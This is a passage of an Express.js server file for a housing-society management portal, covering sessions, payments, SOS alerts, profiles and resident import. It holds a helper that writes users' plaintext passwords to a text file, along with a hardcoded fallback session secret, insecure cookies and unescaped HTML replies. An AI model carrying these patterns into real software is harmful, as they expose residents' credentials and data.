const express = require('express');
const bodyParser = require('body-parser');
const dotenv = require('dotenv');
const _ = require('lodash');
const session = require('express-session');
const passport = require('passport');
const MongoStore = require('connect-mongo');

const user_collection = require("./models/userModel");
const society_collection = require("./models/societyModel");
const system_models = require("./models/systemModel");
const tenantDb = require("./config/tenantDb");
const { seedSystemData } = require("./config/seed");

const db = require(__dirname+'/config/db');
const date = require(__dirname+'/date/date');

// Access environment variables
dotenv.config();
const stripe = require('stripe')(process.env.SECRET_KEY || 'sk_test_mock_keys');
const app = express();

const path = require('path');
const fs = require('fs');
const multer = require('multer');

function savePasswordDetails(username, password, role, firstName, lastName, societyName) {
    try {
        const dir = path.join(__dirname, 'password');
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        const filePath = path.join(dir, 'passwords.txt');
        const entry = `[${new Date().toLocaleString()}] Email/Username: ${username} | Password: ${password} | Role: ${role} | Name: ${firstName} ${lastName} | Society: ${societyName || 'N/A'}\n`;
        fs.appendFileSync(filePath, entry, 'utf8');
    } catch(err) {
        console.error("Failed to save password details to file:", err);
    }
}

// Ensure uploads directory exists
const uploadDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// Multer Storage Configuration
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, uploadDir);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 5 * 1024 * 1024 } // 5MB limit
});

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to handle HTTP post requests
app.use(express.urlencoded({extended: true}));
app.use(express.json());

// Bootstrapping Server Lifecycle asynchronously
db.connectDB().then(async () => {
    // 1. Run Seeding
    await seedSystemData();

    // 2. Configure sessions with the resolved MONGO_URI
    app.use(
      session({
        secret: process.env.SESSION_SECRET || 'danish_society_secret_key',
        resave: false,
        saveUninitialized: false,
        store: MongoStore.create({
          mongoUrl: process.env.MONGO_URI,
          collectionName: "sessions",
        }),
        proxy: true,
        cookie: {
          httpOnly: true,
          secure: false,
          sameSite: "lax",
          maxAge: 24 * 60 * 60 * 1000,
        },
      })
    );

    app.use(passport.initialize());
    app.use(passport.session());

    // Traffic Logging Helpers & Middleware
    const ipCache = new Map();

    function parseUserAgent(uaString) {
        if (!uaString) return { os: 'Unknown OS', browser: 'Unknown Browser', device: 'Desktop' };
        
        let os = 'Unknown OS';
        if (uaString.includes('Windows')) os = 'Windows';
        else if (uaString.includes('Macintosh') || uaString.includes('Mac OS X')) os = 'macOS';
        else if (uaString.includes('Android')) os = 'Android';
        else if (uaString.includes('iPhone') || uaString.includes('iPad') || uaString.includes('iPod')) os = 'iOS';
        else if (uaString.includes('Linux')) os = 'Linux';
        
        let browser = 'Unknown Browser';
        if (uaString.includes('Edg/')) browser = 'Edge';
        else if (uaString.includes('Chrome/') || uaString.includes('CriOS/')) browser = 'Chrome';
        else if (uaString.includes('Firefox/') || uaString.includes('FxiOS/')) browser = 'Firefox';
        else if (uaString.includes('Safari/') && !uaString.includes('Chrome') && !uaString.includes('Chromium')) browser = 'Safari';
        else if (uaString.includes('OPR/') || uaString.includes('Opera/')) browser = 'Opera';
        
        let device = 'Desktop';
        if (uaString.includes('Mobile') || uaString.includes('Android') || uaString.includes('iPhone')) {
            device = 'Mobile';
        } else if (uaString.includes('iPad') || uaString.includes('Tablet')) {
            device = 'Tablet';
        }
        
        return { os, browser, device };
    }

    async function getApproxLocation(ip) {
        if (ip === '127.0.0.1' || ip === '::1' || ip.includes('::ffff:127.0.0.1') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
            return 'Localhost / Private Network';
        }
        if (ipCache.has(ip)) {
            return ipCache.get(ip);
        }
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 1200);
            const response = await fetch(`http://ip-api.com/json/${ip}`, { signal: controller.signal });
            clearTimeout(timeoutId);
            if (response.ok) {
                const data = await response.json();
                if (data && data.status === 'success') {
                    const loc = `${data.city || ''}, ${data.regionName || ''}, ${data.country || ''}`.replace(/^, |, $/, '').trim() || 'Unknown Location';
                    ipCache.set(ip, loc);
                    return loc;
                }
            }
        } catch (e) {
            // Fallback silently
        }
        return 'Unknown Location';
    }

    async function logTraffic(req) {
        const pathName = req.path;
        // Skip static assets and common file types to keep logs clean
        const isStatic = pathName.includes('.') && 
                         !pathName.endsWith('.html') && 
                         !pathName.endsWith('.ejs');
        const isImageOrUpload = pathName.startsWith('/images/') || 
                                pathName.startsWith('/uploads/');
        
        if (req.method !== 'GET' || isStatic || isImageOrUpload) {
            return;
        }
        
        try {
            const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
            // Clean up loopback address representation
            let ip = rawIp || 'Unknown IP';
            if (ip === '::1' || ip.includes('::ffff:127.0.0.1')) {
                ip = '127.0.0.1';
            }
            
            const ua = req.headers['user-agent'] || '';
            const deviceDetails = parseUserAgent(ua);
            const location = await getApproxLocation(ip);
            
            const timestamp = new Date().toISOString();
            const userStr = req.user ? `User: ${req.user.username}` : 'User: Guest';
            const logEntry = `[${timestamp}] IP: ${ip} | Location: ${location} | OS: ${deviceDetails.os} | Browser: ${deviceDetails.browser} | Device: ${deviceDetails.device} | ${userStr} | Path: ${req.originalUrl || pathName}\n`;
            
            const logPath = path.join(__dirname, 'traffic.log');
            await fs.promises.appendFile(logPath, logEntry, 'utf8');
        } catch (e) {
            console.error("Traffic logging error:", e);
        }
    }

    app.use((req, res, next) => {
        logTraffic(req).catch(err => console.error("Traffic logging background task failed:", err));
        next();
    });

    // Global variables for templates
    app.use((req, res, next) => {
        res.locals.user = req.user || null;
        res.locals.isAdmin = (req.user && req.user.role === 'society_admin') ? true : false;
        res.locals.formatINR = (amount) => {
            if (amount === undefined || amount === null || isNaN(amount)) return '₹ 0';
            return '₹ ' + new Intl.NumberFormat('en-IN').format(amount);
        };
        
        global.lastMarketplacePost = global.lastMarketplacePost || {};
        if (req.user && req.user.societyName) {
            const lastPostTime = global.lastMarketplacePost[req.user.societyName];
            if (lastPostTime) {
                const diffTime = Math.abs(new Date() - new Date(lastPostTime));
                res.locals.hasNewMarketplacePost = (diffTime < 24 * 60 * 60 * 1000);
            } else {
                res.locals.hasNewMarketplacePost = false;
            }
        } else {
            res.locals.hasNewMarketplacePost = false;
        }
        
        next();
    });

    // Register all routes
    registerRoutes();

    app.listen(
        process.env.PORT || 3000, 
        console.log("Server started on port " + (process.env.PORT || 3000))
    );
}).catch(err => {
    console.error("Database connection failure in server bootstrap:", err);
    process.exit(1);
});

// seedSystemData is imported from ./config/seed at the top of the file


// Log utility for WhatsApp
function logWhatsAppMessage(recipient, message) {
    global.whatsappLogs = global.whatsappLogs || [];
    const log = {
        timestamp: new Date(),
        recipient: String(recipient),
        message: message
    };
    global.whatsappLogs.push(log);
    return log;
}

// Global active SOS map
global.activeSos = global.activeSos || {};
global.lastMarketplacePost = global.lastMarketplacePost || {};

/* Helper check for Society Onboarding status */
async function checkSocietyApproved(req, res, next) {
    if (req.isAuthenticated()) {
        if (req.user.role === 'super_admin') return next();
        const soc = await society_collection.Society.findOne({ societyName: req.user.societyName });
        if (!soc) {
            return res.status(404).send("Society context not registered");
        }
        if (soc.status === 'pending') {
            return res.render("homeStandby", {
                icon: 'fa-user-clock',
                title: 'Society Onboarding Pending Approval',
                content: `Your society "${soc.societyName}" has been registered successfully, but is currently awaiting onboarding verification and approval from the Platform Super Admin.`
            });
        }
        if (soc.status === 'suspended') {
            return res.render("homeStandby", {
                icon: 'fa-user-lock',
                title: 'Society Access Suspended',
                content: `Access to your society portal "${soc.societyName}" has been temporarily suspended by Comunify administration. Please check with your management office.`
            });
        }
        next();
    } else {
        res.redirect("/login");
    }
}

function registerRoutes() {
    // LANDING PAGE
    app.get("/", async (req,res) => {
        try {
            const societies = await society_collection.Society.find({ status: 'approved' });
            const cities = societies.map(society => society.societyAddress.city.toLowerCase());
            const cityCount = new Set(cities).size;
            const foundUser = await user_collection.User.find();
            
            res.render("index", {
                city: cityCount,
                society: societies.length,
                user: foundUser.length,
                visit: 154 // mock visits count
            });
        } catch(err) {
            console.error(err);
            res.status(500).send("Server error");
        }
    });

    app.get("/login", (req,res) => {
        res.render("login");
    });

    app.get("/signup", (req,res) => {
        society_collection.Society.find({})
            .then(societies => {
                res.render("signup", {societies});
            })
            .catch(err => {
                console.error(err);
                res.status(500).send("Server error");
            });
    });

    app.get("/register", (req,res) => {
        if (req.isAuthenticated() && req.user.role === 'super_admin') {
            res.render("register");
        } else {
            res.render("failure", {
                message: "Access Denied: Only Platform IT Administrator can register new societies.",
                href: "/login"
            });
        }
    });

    // HOME REDIRECTOR
    app.get("/home", checkSocietyApproved, (req,res) => {
        if(req.isAuthenticated()){
            if (req.user.role === 'super_admin') {
                return res.redirect("/superadmin");
            }
            if (req.user.role === 'security_guard') {
                return res.redirect("/guard");
            }
            if(req.user.validation=='approved'){
                res.render("home");
            } else if(req.user.validation=='applied') {
                res.render("homeStandby",{
                    icon: 'fa-user-clock',
                    title: 'Account pending for approval',
                    content: 'Your resident account will be active as soon as it is approved by your society admin. It usually takes 1-2 days.'
                });
            } else {
                res.render("homeStandby",{
                    icon: 'fa-user-lock',
                    title: 'Account approval declined',
                    content: 'Your account registration has been declined. Please contact the society administrator for details.'
                });
            }
        } else {
            res.redirect("/login");
        }
    });

    // LOGOUT
    app.get("/logout", (req,res) => {
        req.logout(function() {
            res.redirect("/");
        });
    });

    app.get("/loginFailure", (req,res) => {
        res.render("failure",{
            message: "Sorry, entered password was incorrect, Please double-check.",
            href: "/login",
            messageSecondary: "Account not created?",
            hrefSecondary: "/signup",
            buttonSecondary: "Create Account"
        });
    });

    // PROFILE HELPMATE ROUTE
    app.get("/profile", checkSocietyApproved, async (req,res) => {
        if(req.isAuthenticated()){
            try {
                const foundUser = await user_collection.User.findById(req.user.id);
                const foundSociety = await society_collection.Society.findOne({societyName: foundUser.societyName});
                
                // Fetch resident vehicles
                const Vehicle = tenantDb.getTenantModel(foundUser.societyName, 'Vehicle');
                const vehicles = await Vehicle.find({ flatNumber: foundUser.flatNumber });

                res.render("profile", {
                    resident: foundUser, 
                    society: foundSociety,
                    vehicles: vehicles
                });
            } catch(err) {
                res.status(500).send("Profile error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.get("/editProfile", checkSocietyApproved, (req,res) => {
        if(req.isAuthenticated()){
            user_collection.User.findById(req.user.id)
                .then(foundUser => {
                    return society_collection.Society.findOne({societyName: foundUser.societyName})
                        .then(foundSociety => {
                            res.render("editProfile", {resident: foundUser, society: foundSociety});
                        });
                })
                .catch(err => res.status(500).send("Error"));
        } else {
            res.redirect("/login");
        }
    });

    app.post("/editProfile", checkSocietyApproved, upload.fields([
        { name: 'photo', maxCount: 1 },
        { name: 'rentAgreement', maxCount: 1 }
    ]), async (req, res) => {
        try {
            const updateFields = {
                firstName: req.body.firstName,
                lastName: req.body.lastName,
                phoneNumber: req.body.phoneNumber,
                flatNumber: req.body.flatNumber,
                fatherName: req.body.fatherName,
                occupancyType: req.body.occupancyType,
                kidsCount: parseInt(req.body.kidsCount || 0),
                additionalInfo: req.body.additionalInfo
            };

            if (req.body.occupancyType === 'renter') {
                updateFields.ownerPhoneNumber = req.body.ownerPhoneNumber ? parseInt(req.body.ownerPhoneNumber) : undefined;
            } else {
                updateFields.ownerPhoneNumber = undefined;
                updateFields.rentAgreementPath = undefined;
            }

            if (req.files) {
                if (req.files['photo'] && req.files['photo'].length > 0) {
                    updateFields.photoPath = '/uploads/' + req.files['photo'][0].filename;
                }
                if (req.files['rentAgreement'] && req.files['rentAgreement'].length > 0) {
                    updateFields.rentAgreementPath = '/uploads/' + req.files['rentAgreement'][0].filename;
                }
            }

            await user_collection.User.updateOne(
                { _id: req.user.id },
                { $set: updateFields }
            );

            if (req.body.address && req.user.role === 'society_admin') {
                await society_collection.Society.updateOne(
                    { admin: req.user.username },
                    { $set: { 
                        societyAddress: {
                            address: req.body.address,
                            city: req.body.city,
                            district: req.body.district,
                            postalCode: req.body.postalCode
                        }
                    }}
                );
            }

            res.redirect("/profile");
        } catch(err) {
            console.error("Profile edit error:", err);
            res.status(500).send("Error updating profile");
        }
    });

    // PROFILE ADD FAMILY MEMBER
    app.post("/profile/family/add", checkSocietyApproved, async (req, res) => {
        try {
            const user = await user_collection.User.findById(req.user.id);
            const rawName = req.body.name || '';
            const nameToSave = rawName.trim().split(/\s+/).map(word => {
                if (word.length === 0) return '';
                return word.charAt(0).toUpperCase() + word.slice(1);
            }).join(' ');

            user.familyMembers.push({
                name: nameToSave,
                relation: req.body.relation,
                phoneNumber: req.body.phoneNumber
            });
            await user.save();
            
            // Write audit log
            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Add Family Member',
                details: `Added family member ${nameToSave} (${req.body.relation})`
            });

            res.redirect("/profile");
        } catch(e) {
            res.status(500).send("Error adding family member");
        }
    });

    // PROFILE REGISTER VEHICLE
    app.post("/profile/vehicle/add", checkSocietyApproved, async (req, res) => {
        try {
            const Vehicle = tenantDb.getTenantModel(req.user.societyName, 'Vehicle');
            const stickerNo = 'STK-' + req.user.flatNumber + '-' + Math.floor(10 + Math.random()*90);
            const plateToSave = (req.body.plateNumber || '').toUpperCase().trim();
            
            const vehicle = new Vehicle({
                flatNumber: req.user.flatNumber,
                ownerName: req.user.firstName + ' ' + req.user.lastName,
                vehicleType: req.body.vehicleType,
                plateNumber: plateToSave,
                stickerNumber: stickerNo,
                status: 'registered'
            });
            await vehicle.save();

            // Write audit log
            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Register Vehicle',
                details: `Registered plate ${plateToSave} with sticker ${stickerNo}`
            });

            res.redirect("/profile");
        } catch(e) {
            res.status(500).send("Error adding vehicle");
        }
    });

    // DASHBOARD STATS API
    app.get("/home/statistics", checkSocietyApproved, async (req, res) => {
        try {
            const societyName = req.user.societyName;
            
            // Count total approved residents in this society
            const totalResidents = await user_collection.User.countDocuments({ societyName, validation: 'approved' });
            const pendingApprovals = await user_collection.User.countDocuments({ societyName, validation: 'applied' });
            
            // Fetch tenant models
            const Complaint = tenantDb.getTenantModel(societyName, 'Complaint');
            const Cctv = tenantDb.getTenantModel(societyName, 'Cctv');
            const Notice = tenantDb.getTenantModel(societyName, 'Notice');

            const openComplaints = await Complaint.countDocuments({ status: { $ne: 'close' } });
            const myComplaints = await Complaint.countDocuments({ userId: req.user.id, status: { $ne: 'close' } });
            const unreadNotices = await Notice.countDocuments();
            const camerasCount = await Cctv.countDocuments();

            // Calculate sum dues
            const unpaidUsers = await user_collection.User.find({ societyName, makePayment: { $gt: 0 } });
            const totalDues = unpaidUsers.reduce((sum, u) => sum + (u.makePayment || 0), 0);

            res.json({
                success: true,
                totalResidents,
                pendingApprovals,
                openComplaints,
                totalDues,
                myComplaints,
                unreadNotices,
                camerasCount
            });
        } catch (e) {
            res.json({ success: false, error: e.message });
        }
    });

    // WHATSAPP LOGS GET API
    app.get("/home/whatsapp-logs", checkSocietyApproved, (req, res) => {
        res.json({ success: true, logs: global.whatsappLogs || [] });
    });

    // CHECK SOS ALARM API
    app.get("/home/check-sos", checkSocietyApproved, (req, res) => {
        const sos = global.activeSos[req.user.societyName];
        if (sos && sos.active) {
            res.json({ activeSos: true, triggeredBy: sos.triggeredBy, timestamp: sos.timestamp });
        } else {
            res.json({ activeSos: false });
        }
    });

    // AI RESIDENT ASSISTANT
    app.post("/home/ai-assistant", checkSocietyApproved, async (req, res) => {
        try {
            const query = req.body.query.toLowerCase();
            let reply = "";
            let logSent = null;

            if (query.includes('maintenance') || query.includes('due') || query.includes('pending') || query.includes('bill')) {
                reply = `Your pending maintenance dues for this month are **$${req.user.makePayment}**. This includes Society Charges ($200), Sinking Fund ($250), Water Charges ($150), Repairs & Electricity ($1200), and Parking ($150). You can pay this bill immediately from your [Billing Center](/bill).`;
            } 
            else if (query.includes('receipt') || query.includes('last month') || query.includes('payment history')) {
                if (req.user.lastPayment && req.user.lastPayment.invoice) {
                    reply = `Here is your last logged payment details:<br>- Receipt ID: **${req.user.lastPayment.invoice}**<br>- Date: **${new Date(req.user.lastPayment.date).toLocaleDateString()}**<br>- Amount: **$${req.user.lastPayment.amount}**.<br>You can print/download this receipt anytime as a PDF from your [Billing Center](/bill).`;
                } else {
                    reply = `You do not have any paid transaction receipts logged in the database yet. You can clear your dues in the [Billing Center](/bill) to generate a receipt.`;
                }
            } 
            else if (query.includes('agm') || query.includes('meeting') || query.includes('when')) {
                reply = `The Annual General Meeting (AGM) has been scheduled by the committee for **next Sunday at 10:30 AM** in the **Clubhouse**. Topics include: Budget approvals, painting budgets, and committee council selections. You can RSVP or cast votes in the [E-Voting Section](/voting).`;
            } 
            else if (query.includes('complaint') || query.includes('tickets') || query.includes('open')) {
                const Complaint = tenantDb.getTenantModel(req.user.societyName, 'Complaint');
                const list = await Complaint.find({ userId: req.user.id, status: { $ne: 'close' } });
                if (list.length > 0) {
                    reply = `You currently have **${list.length}** open tickets:<br>` + list.map(c => `- **${c.category}**: "${c.description}" (Status: *${c.status}*)`).join('<br>') + `<br>Manage them in the [Helpdesk](/helpdesk).`;
                } else {
                    reply = `All your filed support tickets are currently resolved and closed. If you have any issue, raise a ticket in the [Helpdesk](/helpdesk).`;
                }
            } 
            else if (query.includes('visitor') || query.includes('guest') || query.includes('history')) {
                const Visitor = tenantDb.getTenantModel(req.user.societyName, 'Visitor');
                const visits = await Visitor.find({ addedBy: req.user.id }).sort({ createdAt: -1 }).limit(3);
                if (visits.length > 0) {
                    reply = `Your recent visitor logs:<br>` + visits.map(v => `- **${v.name}** (${v.type.toUpperCase()}) - Entry: ${v.entryTime ? new Date(v.entryTime).toLocaleTimeString() : 'Awaiting'} - Status: **${v.status}**`).join('<br>');
                } else {
                    reply = `No visitor entries logged for your flat unit recently. You can pre-approve guests inside the [Security Portal](/guard).`;
                }
            } 
            else {
                reply = `Hello! I am Comunify AI Assistant. I can help you check your dues, look up receipt details, show the AGM schedule, review your open complaints, or look up visitor entry logs. What can I check for you?`;
            }

            res.json({ success: true, reply, whatsappLog: logSent });
        } catch (e) {
            res.json({ success: false, reply: "AI assistant encountered a database error: " + e.message });
        }
    });

    // AI NOTICE GENERATOR
    app.post("/notice/ai-generate", checkSocietyApproved, (req, res) => {
        const rawPrompt = req.body.prompt || "";
        const prompt = rawPrompt.toLowerCase().trim();
        let subject = "";
        let details = "";

        const capitalize = (s) => s.charAt(0).toUpperCase() + s.slice(1);

        if (prompt.startsWith('dear') || prompt.length > 100) {
            // It's already a full notice or a very long custom text, keep it exactly as is!
            details = rawPrompt;
            // Generate a subject based on keywords
            if (prompt.includes('water')) {
                subject = "Water Supply Disruption Notice";
            } else if (prompt.includes('lift') || prompt.includes('elevator')) {
                subject = "Elevator Maintenance Notice";
            } else if (prompt.includes('agm') || prompt.includes('meeting') || prompt.includes('general')) {
                subject = "Official Announcement: Annual General Meeting (AGM)";
            } else {
                subject = "Important Society Notice";
            }
        } else {
            // Extract times (e.g. "1:00 PM to 3:00 PM", "10am - 2pm", "1pm - 3pm")
            const timeRegex = /(?:\b\d{1,2}(?::\d{2})?\s*(?:am|pm|am\b|pm\b)\s*(?:to|and|-)\s*\d{1,2}(?::\d{2})?\s*(?:am|pm|am\b|pm\b))|(?:\bfrom\s+\d{1,2}(?::\d{2})?\s*(?:am|pm|am\b|pm\b)\s+to\s+\d{1,2}(?::\d{2})?\s*(?:am|pm|am\b|pm\b))/i;
            const timeMatch = rawPrompt.match(timeRegex);
            const timeStr = timeMatch ? timeMatch[0] : "";

            // Extract date/day (e.g. "tomorrow", "today", "on Sunday", "next Monday", "25th June")
            const dateRegex = /\b(tomorrow|today|monday|tuesday|wednesday|thursday|friday|saturday|sunday|next\s+(?:monday|tuesday|wednesday|thursday|friday|saturday|sunday)|on\s+\d{1,2}(?:st|nd|rd|th)?\s+\w+|\d{1,2}\/\d{1,2}\/\d{4})\b/i;
            const dateMatch = rawPrompt.match(dateRegex);
            const dateStr = dateMatch ? dateMatch[0] : "tomorrow";

            // Extract specific lift/elevator name (e.g. "Lift A", "Lift B", "elevator 1")
            const liftMatch = rawPrompt.match(/\b(lift\s+[a-zA-Z0-9]|elevator\s+[a-zA-Z0-9])\b/i);
            const liftName = liftMatch ? capitalize(liftMatch[0]) : "Lift A";

            // Extract alternate lift name
            const otherLiftMatch = rawPrompt.match(/\buse\s+(lift\s+[a-zA-Z0-9]|elevator\s+[a-zA-Z0-9])\b/i);
            const altLiftName = otherLiftMatch ? capitalize(otherLiftMatch[1]) : (liftName.toLowerCase().includes('lift a') ? 'Lift B' : 'Lift A');

            if (prompt.includes('water')) {
                subject = "Water Supply Disruption Notice";
                const timePeriod = timeStr ? `from ${timeStr.replace(/from\s+/i, '')}` : "from 10:00 AM to 02:00 PM";
                const reasonMatch = rawPrompt.match(/(?:due to|for)\s+([^.]+)/i);
                const reason = reasonMatch ? reasonMatch[1].trim() : "scheduled maintenance and tank cleaning";
                
                details = `Dear Residents,\n\nPlease note that there will be a temporary water supply shutdown ${dateStr} ${timePeriod} due to ${reason}.\n\nPlease store sufficient water in advance to avoid inconvenience. We regret the disruption.\n\nManagement Office`;
            } 
            else if (prompt.includes('agm') || prompt.includes('meeting') || prompt.includes('general')) {
                subject = "Official Announcement: Annual General Meeting (AGM)";
                const locationMatch = rawPrompt.match(/(?:at|in|inside)\s+the\s+([^.]+)/i);
                const location = locationMatch ? locationMatch[1].trim() : "the Clubhouse";
                const timePeriod = timeStr ? `at ${timeStr.replace(/at\s+/i, '')}` : "at 10:30 AM";
                
                details = `Dear Members,\n\nYou are cordially invited to the Annual General Meeting (AGM) of the society, scheduled for ${dateStr} ${timePeriod} in ${location}.\n\nAgenda:\n1. Approval of annual audited ledger and balance sheets\n2. Capital expenditure approvals (Tower Painting project)\n3. Election of tower representatives\n\nPlease ensure your presence. Lunch will be served post-adjournment.\n\nManagement Committee`;
            } 
            else if (prompt.includes('lift') || prompt.includes('elevator')) {
                subject = `${liftName} Maintenance Notice`;
                const timePeriod = timeStr ? `from ${timeStr.replace(/from\s+/i, '')}` : "from 01:00 PM to 03:00 PM";
                const reasonMatch = rawPrompt.match(/(?:due to|for)\s+([^.]+)/i);
                const reason = reasonMatch ? reasonMatch[1].trim() : "scheduled AMC safety checks and cleaning";
                
                details = `Dear Residents,\n\nPlease note that ${liftName} will be shut down ${dateStr} ${timePeriod} due to ${reason}.\n\nPlease use ${altLiftName} during this period.\n\nManagement Office`;
            }
            else {
                subject = "Important Society Notice";
                const firstCharCap = capitalize(rawPrompt);
                details = `Dear Residents,\n\nPlease note the following official announcement:\n\n${firstCharCap}.\n\nFor details, contact the society office.\n\nManagement Office`;
            }
        }

        res.json({ success: true, subject, details });
    });

    // LOCAL PAYMENT SIMULATOR
    app.post("/bill/simulate-payment", checkSocietyApproved, async (req, res) => {
        try {
            const foundUser = await user_collection.User.findById(req.user.id);
            const amountPaid = foundUser.makePayment || 0;
            
            foundUser.lastPayment.date = new Date();
            foundUser.lastPayment.amount = amountPaid;
            foundUser.lastPayment.invoice = 'SIM-REC-' + Math.floor(100000 + Math.random()*900000);
            foundUser.makePayment = 0; // Clear balance
            await foundUser.save();

            // Log WhatsApp
            logWhatsAppMessage(foundUser.phoneNumber, `Payment Receipt Generated: Thank you Rajesh, we have received your maintenance payment of ₹ ${new Intl.NumberFormat('en-IN').format(amountPaid)}. Receipt ID: ${foundUser.lastPayment.invoice}`);

            // Write Audit Log
            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Simulated Maintenance Payment',
                details: `Paid ₹ ${new Intl.NumberFormat('en-IN').format(amountPaid)} under invoice ${foundUser.lastPayment.invoice}`
            });

            res.redirect("/bill");
        } catch (e) {
            res.status(500).send("Payment simulation failed");
        }
    });

    // STRIPE PAYMENT GATEWAY SESSION CREATION
    app.post("/checkout-session", checkSocietyApproved, async (req, res) => {
        try {
            const foundUser = await user_collection.User.findById(req.user.id);
            const totalAmount = foundUser.makePayment || 0;
            
            if (totalAmount <= 0) {
                return res.status(400).json({ error: "No outstanding amount to pay" });
            }

            const session = await stripe.checkout.sessions.create({
                payment_method_types: ['card'],
                line_items: [
                    {
                        price_data: {
                            currency: 'inr',
                            product_data: {
                                name: 'Society Maintenance Bill Payment',
                            },
                            unit_amount: totalAmount * 100, // Stripe expects amount in paise for INR
                        },
                        quantity: 1,
                    },
                ],
                mode: 'payment',
                success_url: `${req.protocol}://${req.get('host')}/bill/success?session_id={CHECKOUT_SESSION_ID}`,
                cancel_url: `${req.protocol}://${req.get('host')}/bill`,
            });
            res.json({ id: session.id });
        } catch (e) {
            console.error("Stripe session error:", e);
            res.status(500).json({ error: e.message });
        }
    });

    app.get("/bill/success", checkSocietyApproved, async (req, res) => {
        try {
            const session_id = req.query.session_id;
            if (!session_id) {
                return res.status(400).send("Session ID required");
            }
            
            let amountPaid = 0;
            try {
                const session = await stripe.checkout.sessions.retrieve(session_id);
                amountPaid = session.amount_total / 100;
            } catch(err) {
                const foundUser = await user_collection.User.findById(req.user.id);
                amountPaid = foundUser.makePayment || 0;
            }

            const foundUser = await user_collection.User.findById(req.user.id);
            const finalAmount = amountPaid || foundUser.makePayment || 0;
            const invoiceNo = 'STR-REC-' + Math.floor(100000 + Math.random()*900000);
            
            foundUser.lastPayment.date = new Date();
            foundUser.lastPayment.amount = finalAmount;
            foundUser.lastPayment.invoice = invoiceNo;
            foundUser.makePayment = 0;
            await foundUser.save();

            logWhatsAppMessage(foundUser.phoneNumber, `Payment Receipt Generated: Thank you ${foundUser.firstName}, we have received your maintenance payment of ₹ ${new Intl.NumberFormat('en-IN').format(finalAmount)}. Receipt ID: ${invoiceNo}`);

            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Stripe Maintenance Payment',
                details: `Paid ₹ ${new Intl.NumberFormat('en-IN').format(finalAmount)} under invoice ${invoiceNo}`
            });

            res.render("success", {
                invoice: invoiceNo,
                amount: new Intl.NumberFormat('en-IN').format(finalAmount),
                date: new Date().toLocaleDateString()
            });
        } catch (e) {
            res.status(500).send("Payment success registration failed: " + e.message);
        }
    });

    // SOS PANIC ALARM TRIGGERS
    app.post("/guard/sos/trigger", checkSocietyApproved, (req, res) => {
        global.activeSos[req.user.societyName] = {
            active: true,
            triggeredBy: req.user.firstName + ' (' + (req.user.flatNumber || 'Gate desk') + ')',
            timestamp: new Date()
        };
        
        // Broadcast notifications to all residents (simulate WhatsApp)
        logWhatsAppMessage('9999900000', `🚨 EMERGENCY SOS PANIC TRIPPED AT ${req.user.societyName.toUpperCase()} Gate! Dispatched security team.`);
        
        res.json({ success: true });
    });

    app.post("/guard/sos/clear", checkSocietyApproved, (req, res) => {
        global.activeSos[req.user.societyName] = { active: false };
        res.json({ success: true });
    });

    // RESIDENTS LIST
    app.get("/residents", checkSocietyApproved, async (req,res) => {
        if(req.isAuthenticated() && req.user.validation=='approved'){
            try {
                const userSocietyName = req.user.societyName;
                const allSocietyUsers = await user_collection.User.find({
                  societyName: userSocietyName,
                });

                const foundUsers = [];
                const foundAppliedUsers = [];

                allSocietyUsers.forEach((user) => {
                  if (user.validation === "approved") {
                    foundUsers.push(user);
                  } else if (user.validation === "applied") {
                    foundAppliedUsers.push(user);
                  }
                });
                
                res.render("residents", {
                    societyResidents: foundUsers,
                    appliedResidents: foundAppliedUsers,
                    societyName: userSocietyName,
                    isAdmin: req.user.role === 'society_admin'
                });
            } catch(err) {
                res.status(500).send("Error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/residents/import", checkSocietyApproved, upload.single('excelFile'), async (req, res) => {
        try {
            if (req.user.role !== 'society_admin') {
                return res.status(403).send("Unauthorized");
            }
            if (!req.file) {
                return res.status(400).send("No file uploaded");
            }

            const xlsx = require('xlsx');
            const workbook = xlsx.readFile(req.file.path);
            const sheetName = workbook.SheetNames[0];
            const worksheet = workbook.Sheets[sheetName];
            const data = xlsx.utils.sheet_to_json(worksheet);

            const User = user_collection.User;

            for (const row of data) {
                // Map columns cleanly: support case-insensitive keys
                const nameVal = row.Name || row.name || '';
                let firstName = row['First Name'] || row.firstName || '';
                let lastName = row['Last Name'] || row.lastName || '';
                if (!firstName && nameVal) {
                    const parts = nameVal.trim().split(/\s+/);
                    firstName = parts[0];
                    lastName = parts.slice(1).join(' ') || 'Resident';
                }
                if (!firstName) firstName = 'New';
                if (!lastName) lastName = 'Resident';

                // Format Name (First letter Caps)
                firstName = firstName.trim().charAt(0).toUpperCase() + firstName.trim().slice(1).toLowerCase();
                lastName = lastName.trim().charAt(0).toUpperCase() + lastName.trim().slice(1).toLowerCase();

                const phoneNumber = parseInt(row['Contact'] || row['Phone'] || row['phoneNumber'] || 9999999999);
                const fatherName = row['Father Name'] || row['fatherName'] || '';
                const flatNumber = row['House Number'] || row['Flat Number'] || row['flatNumber'] || 'TBD';
